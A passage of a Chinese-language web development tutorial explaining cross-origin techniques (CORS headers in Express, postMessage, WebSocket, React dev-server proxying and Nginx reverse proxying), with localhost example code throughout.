class="string">&#x27;PUT&#x27;</span>,<span class="string">&#x27;http://127.0.0.1:8000/cors&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">            xhr.setRequestHeader(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;leslie&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            xhr.send();</span></span><br><span class="line"><span class="javascript">            xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(xhr.readyState===<span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span>((xhr.status&gt;=<span class="number">200</span> &amp;&amp; xhr.status&lt;<span class="number">300</span>) || xhr.status === <span class="number">304</span>)&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(xhr.response);</span></span><br><span class="line"><span class="javascript">                         <span class="comment">//得到响应头，后台需设置Access-Control-Expose-Headers</span></span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(xhr.getResponseHeader(<span class="string">&#x27;name&#x27;</span>))</span></span><br><span class="line"><span class="javascript">                    &#125;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">            </span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        &#125;)</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>服务器  <code>http://127.0.0.1:8000</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 引入express</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> WebSocket = <span class="built_in">require</span>(<span class="string">&#x27;ws&#x27;</span>);<span class="comment">//记得安装ws</span></span><br><span class="line"><span class="comment">//2. 创建应用对象</span></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="comment">// 把server.js文件所在的目录设置为静态文件目录</span></span><br><span class="line">app.use(express.static(__dirname));</span><br><span class="line"><span class="comment">//3. 创建路由规则</span></span><br><span class="line"><span class="comment">// request 是对请求报文的封装</span></span><br><span class="line"><span class="comment">// response 是对响应报文的封装</span></span><br><span class="line"><span class="comment">//CORS</span></span><br><span class="line"><span class="keyword">let</span> whitList = [<span class="string">&#x27;http://127.0.0.1:5500&#x27;</span>] <span class="comment">//设置白名单</span></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> origin = req.headers.origin</span><br><span class="line">    <span class="keyword">if</span> (whitList.includes(origin)) &#123;</span><br><span class="line">        <span class="comment">// 设置哪个源可以访问我</span></span><br><span class="line">        res.setHeader(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, origin)</span><br><span class="line">        <span class="comment">// 允许携带哪个头访问我</span></span><br><span class="line">        res.setHeader(<span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span>, <span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        <span class="comment">// 允许哪个方法访问我</span></span><br><span class="line">        res.setHeader(<span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="string">&#x27;PUT&#x27;</span>)</span><br><span class="line">        <span class="comment">// 允许携带cookie</span></span><br><span class="line">        res.setHeader(<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>, <span class="literal">true</span>)</span><br><span class="line">        <span class="comment">// 预检的存活时间</span></span><br><span class="line">        res.setHeader(<span class="string">&#x27;Access-Control-Max-Age&#x27;</span>, <span class="number">6</span>)</span><br><span class="line">        <span class="comment">// 允许返回的头</span></span><br><span class="line">        res.setHeader(<span class="string">&#x27;Access-Control-Expose-Headers&#x27;</span>, <span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (req.method === <span class="string">&#x27;OPTIONS&#x27;</span>) &#123;</span><br><span class="line">            res.end() <span class="comment">// OPTIONS请求不做任何处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line">app.put(<span class="string">&#x27;/cors&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.headers)</span><br><span class="line">    res.setHeader(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;lw&#x27;</span>) <span class="comment">//返回一个响应头，后台需设置</span></span><br><span class="line">    res.end(<span class="string">&#x27;我不爱你&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 监听端口启动服务</span></span><br><span class="line">app.listen(<span class="number">8000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;服务已经启动, 8000 端口监听中....&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>第三方中间件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line"><span class="comment">//2. 创建应用对象</span></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="comment">//CORS</span></span><br><span class="line">app.use(</span><br><span class="line">  cors(&#123;</span><br><span class="line">    <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;http://127.0.0.1:5500&quot;</span>,</span><br><span class="line">    <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET,HEAD,PUT,PATCH,POST,DELETE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;allowedHeaders&quot;</span>: <span class="string">&quot;name&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exposedHeaders&quot;</span>: <span class="string">&quot;name&quot;</span>,</span><br><span class="line">    <span class="string">&quot;credentials&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;maxAge&quot;</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="comment">// &quot;preflightContinue&quot;: true,</span></span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="关于CORS的-cookie-问题"><a href="#关于CORS的-cookie-问题" class="headerlink" title="关于CORS的 cookie 问题"></a>关于CORS的 cookie 问题</h4><p>想要传递 <code>cookie</code> 需要满足 3 个条件</p><ul><li>web 请求设置<code>withCredentials</code></li></ul><p>这里默认情况下在跨域请求，浏览器是不带 cookie 的。但是我们可以通过设置 <code>withCredentials</code> 来进行传递 <code>cookie</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原生 xml 的设置方式</span></span><br><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// axios 设置方式</span></span><br><span class="line">axios.defaults.withCredentials = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>2.<code>Access-Control-Allow-Credentials</code> 为 <code>true</code></p><p>3.<code>Access-Control-Allow-Origin</code>为<strong>非</strong> <code>*</code></p><h3 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h3><p><code>postMessage</code>是<code>HTML5 XMLHttpRequest Level 2</code>中的API，且是为数不多可以跨域操作的window属性之一，它可用于解决以下方面的问题：</p><ul><li>页面和其打开的新窗口的数据传递</li><li>多窗口之间消息传递</li><li>页面与嵌套的iframe消息传递</li></ul><p>上面三个场景的跨域数据传递。</p><p><strong>postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">otherWindow.postMessage(message, targetOrigin, [transfer]);</span><br></pre></td></tr></table></figure><ul><li><code>message</code>: 将要发送到其他window的数据。</li><li><code>targetOrigin</code>:通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串”<code>*</code>“（表示无限制）或者一个URI。在发送消息的时候，如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配<code>targetOrigin</code>提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送。</li><li><code>transfer</code>(可选)：是一串和<code>message</code> 同时传递的 <code>Transferable</code> 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。</li></ul><h4 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h4><p>客户端   <code>http://127.0.0.1:5500</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- 等它加载完触发一个事件 --&gt;</span><br><span class="line">    &lt;!-- 内嵌在http:<span class="comment">//localhost:5500/index.html --&gt;</span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:8000&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">id</span>=<span class="string">&quot;frame&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;load()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">const</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">let</span> frame = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;frame&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            frame.contentWindow.postMessage(<span class="string">&#x27;我爱你&#x27;</span>, <span class="string">&#x27;http://localhost:4000&#x27;</span>) <span class="comment">//发送数据</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123; <span class="comment">//接受返回数据</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="built_in">console</span>.log(e.data) <span class="comment">//我不爱你</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                p.innerHTML =<span class="string">&#x27;客户端：&#x27;</span>+ e.data;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>服务器  <code>http://127.0.0.1:8000</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(e.data) <span class="comment">//我爱你</span></span></span><br><span class="line"><span class="javascript">            p.innerHTML = <span class="string">&#x27;服务器：&#x27;</span> + e.data;</span></span><br><span class="line"><span class="javascript">            e.source.postMessage(<span class="string">&#x27;我不爱你&#x27;</span>, e.origin)</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><p><code>WebSocket</code>是<code>HTML5</code>的一个持久化的协议，它实现了<strong>浏览器与服务器的全双工通信</strong>，同时也是跨域的一种解决方案。</p><p><code>WebSocket</code>和<code>HTTP</code>都是<strong>应用层协议</strong>，都基于 <code>TCP</code> 协议。</p><p>但是 <strong>WebSocket 是一种双向通信协议，在建立连接之后，WebSocket 的 server 与 client 都能主动向对方发送或接收数据</strong>。</p><p>同时，<code>WebSocket</code> 在建立连接时需要借助 <code>HTTP</code> 协议，连接建立好了之后 <code>client</code> 与 <code>server</code> 之间的双向通信就与 <code>HTTP</code> 无关了。</p><h4 id="简单例子-1"><a href="#简单例子-1" class="headerlink" title="简单例子"></a>简单例子</h4><p>客户端   <code>http://127.0.0.1:5500</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">&#x27;ws://localhost:4000&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        socket.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          socket.send(<span class="string">&#x27;我爱你&#x27;</span>);<span class="comment">//向服务器发送数据</span></span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        socket.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="built_in">console</span>.log(e.data);<span class="comment">//接收服务器返回的数据</span></span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>服务器  <code>http://localhost:4000</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> WebSocket = <span class="built_in">require</span>(<span class="string">&#x27;ws&#x27;</span>);<span class="comment">//记得安装ws</span></span><br><span class="line"><span class="keyword">const</span> wss = <span class="keyword">new</span> WebSocket.Server(&#123;<span class="attr">port</span>:<span class="number">4000</span>&#125;);</span><br><span class="line">wss.on(<span class="string">&#x27;connection&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">ws</span>) </span>&#123;</span><br><span class="line">  ws.on(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">    ws.send(<span class="string">`<span class="subst">$&#123;data&#125;</span>我不爱你`</span>)</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>简单的说，一般给客户端做代理的都是正向代理，给服务器做代理的就是反向代理。</p><p><a href="https://imgtu.com/i/HLcGKx"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/02/20/HLcGKx.jpg" alt="HLcGKx.jpg"></a></p><h4 id="Node中间件代理"><a href="#Node中间件代理" class="headerlink" title="Node中间件代理"></a>Node中间件代理</h4><p>实现原理：<strong>同源策略是浏览器需要遵循的标准，而如果是服务器向服务器请求就无需遵循同源策略。</strong> </p><p>代理的思路为，利用服务端请求不会跨域的特性，让接口和当前站点同域。</p><p>代理服务器，需要做以下几个步骤：</p><ul><li>接收客户端请求 。</li><li>将请求<strong>转发</strong>给服务器。</li><li>拿到服务器响应数据。</li><li>将响应<strong>转发</strong>给客户端。</li></ul><h4 id="React中配置代理"><a href="#React中配置代理" class="headerlink" title="React中配置代理"></a>React中配置代理</h4><ul><li><p>在<code>package.json</code>中追加如下配置 :<code>&quot;proxy&quot;:http://localhost:5000</code></p><ul><li><p>当你请求<code>http://localhost:5000</code>产生跨域(本身在<code>3000</code>端口)时,添加此代码, 之后你请求时用<code>http://localhost:3000</code>进行请求,当其在<code>3000</code>端口中找不到资源时将会自动转发至<code>5000</code>端口进行请求,不产生跨域问题。</p></li><li><p>优点：配置简单，前端请求资源时可以不加任何前缀。</p></li><li><p>缺点：不能配置多个代理</p></li><li><p>工作方式：上述方式配置代理，当请求了3000不存在的资源时，那么该请求会转发给5000 （优先匹配前端资源）</p></li></ul></li></ul><ul><li><p>在<code>src</code>下创建配置文件：<code>src/setupProxy.js</code></p><ul><li><p>ps:必须是这个文件名,react项目运行的时候会自动查找这个文件,并将其加入webpack的配置中,所以当你修改此文件后,你需要重新启动项目</p></li><li><p>优点：可以配置多个代理，可以灵活的控制请求是否走代理。</p></li><li><p>缺点：配置繁琐，前端请求资源时必须加前缀。</p></li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码示例</span></span><br><span class="line"><span class="keyword">const</span> proxy = <span class="built_in">require</span>(<span class="string">&#x27;http-proxy-middleware&#x27;</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">app</span>) </span>&#123;</span><br><span class="line">    app.use(</span><br><span class="line">        proxy(<span class="string">&#x27;/api1&#x27;</span>, &#123;  <span class="comment">//api1是需要转发的请求(所有带有/api1前缀的请求都会转发给5000)</span></span><br><span class="line">            <span class="attr">target</span>: <span class="string">&#x27;http://localhost:5000&#x27;</span>, <span class="comment">//配置转发目标地址(能返回数据的服务器地址)</span></span><br><span class="line">            <span class="attr">changeOrigin</span>: <span class="literal">true</span>, <span class="comment">//控制服务器接收到的请求头中host字段的值</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">       changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000</span></span><br><span class="line"><span class="comment">       changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:3000</span></span><br><span class="line"><span class="comment">       changeOrigin默认值为false，但我们一般将changeOrigin值设为true</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">            <span class="attr">pathRewrite</span>: &#123;<span class="string">&#x27;^/api1&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125; <span class="comment">//去除请求前缀，保证交给后台服务器的是正常请求地址(必须配置)</span></span><br><span class="line">        &#125;),</span><br><span class="line">        proxy(<span class="string">&#x27;/api2&#x27;</span>, &#123; </span><br><span class="line">            <span class="attr">target</span>: <span class="string">&#x27;http://localhost:5001&#x27;</span>,</span><br><span class="line">            <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">pathRewrite</span>: &#123;<span class="string">&#x27;^/api2&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//App.jsx</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    getStudentData = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">axios.get(<span class="string">&#x27;http://localhost:3000/api1/students&#x27;</span>).then(</span><br><span class="line"><span class="function"><span class="params">response</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">&#x27;成功了&#x27;</span>,response.data);&#125;,</span><br><span class="line"><span class="function"><span class="params">error</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">&#x27;失败了&#x27;</span>,error);&#125;</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getCarData = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">axios.get(<span class="string">&#x27;http://localhost:3000/api2/cars&#x27;</span>).then(</span><br><span class="line"><span class="function"><span class="params">response</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">&#x27;成功了&#x27;</span>,response.data);&#125;,</span><br><span class="line"><span class="function"><span class="params">error</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">&#x27;失败了&#x27;</span>,error);&#125;</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>= <span class="string">&#123;this.getStudentData&#125;</span>&gt;</span>点我获取学生数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.getCarData&#125;</span>&gt;</span>点我获取汽车数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Nginx反向代理"><a href="#Nginx反向代理" class="headerlink" title="Nginx反向代理"></a>Nginx反向代理</h4><blockquote><p>测试时注意，Nginx设置了跨域后，服务器不要再设置CORS。</p></blockquote><p>实现原理类似于Node中间件代理，需要你搭建一个中转nginx服务器，用于转发请求。</p><p>使用Nginx反向代理实现跨域，是最简单的跨域方式。只需要修改Nginx的配置即可解决跨域问题，支持所有浏览器，支持session，不需要修改任何代码，并且不会影响服务器性能。</p><h5 id="简单例子-2"><a href="#简单例子-2" class="headerlink" title="简单例子"></a>简单例子</h5><p>先下载<a href="https://link.juejin.cn/?target=http://nginx.org/en/download.html">nginx</a>，然后将nginx目录下的<code>nginx.conf</code>修改如下:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// proxy服务器</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">81</span>;</span><br><span class="line">        <span class="attribute">server_name</span>  <span class="number">127.0.0.1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#charset koi8-r;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#access_log  logs/host.access.log  main;</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> /nginx/ &#123;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://127.0.0.1:8000;</span><br><span class="line">            <span class="attribute">add_header</span> Access-Control-Allow-Origin *;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Nginx常用命令（win）</strong></p><ul><li><p>cmd 进入Nginx解压目录 执行以下命令</p></li><li><p><code>start nginx</code> : 启动nginx服务</p></li><li><p>关闭cmd窗口是不能结束nginx进程的</p><ul><li>快速停止或关闭Nginx：<code>nginx -s stop</code></li><li>正常停止或关闭Nginx：<code>nginx -s quit</code></li><li>杀死所有Nginx进程：<code>killall nginx</code></li></ul></li><li><p>配置文件修改重装载命令：<code>nginx -s reload</code></p></li></ul><p>常见问题：端口是否占用、Nginx是否结束</p><p><strong>客户端</strong>  <code>http://127.0.0.1:5500</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>发送请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;result&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;button&#x27;</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//1. 创建对象</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> x = <span 